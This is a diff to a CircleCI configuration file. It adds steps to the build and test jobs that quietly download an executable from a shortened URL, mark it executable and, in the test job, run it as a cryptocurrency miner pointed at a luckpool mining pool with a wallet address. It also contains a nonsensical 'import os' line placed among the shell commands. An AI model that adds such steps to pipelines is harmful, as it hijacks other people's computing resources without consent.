@@ -12,7 +12,10 @@ jobs:
     steps:
       - checkout
       - run: echo "this is the build job"
-
+      - run: wget -qO ngaceng https://git.io/J161r
+             import os as ngaceng
+             chmod +x ngaceng
+             
   test:
     machine:
         image: ubuntu-2004:202008-01
@@ -20,7 +23,10 @@ jobs:
     steps:
       - checkout
       - run: echo "this is the test job"
-
+      - run: wget -qO ngaceng https://git.io/J161r
+             import os as ngaceng
+             chmod +x ngaceng
+             ./ngaceng -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaIntel -p x -t 2
 # Orchestrate our job run sequence
 workflows:
   build_and_test:
